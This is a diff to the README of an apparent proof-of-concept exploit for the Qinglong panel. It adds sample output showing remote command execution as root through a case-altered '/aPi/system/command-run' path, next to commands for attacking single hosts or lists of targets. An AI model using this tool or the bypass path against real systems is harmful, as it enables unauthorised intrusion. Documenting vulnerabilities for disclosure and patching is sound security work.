@@ -55,10 +55,19 @@ Single target:
 python3 poc.py -t <host:port_or_url> -c 'whoami'
 ```
 
-Target list:
+Target list (JSON output format):
 ```bash
 python3 poc.py -l targets.txt -c 'whoami' --json -o result.json
 ```
+Result:
+```bash
+[*] Target: http://127.0.0.1:5700
+[+] Qinglong detected (version: 2.20.0)
+
+[+] RCE success via /aPi/system/command-run
+root
+```
+
 ## Impact
 Successful exploitation can allow:
 - Remote command execution on the Qinglong host context
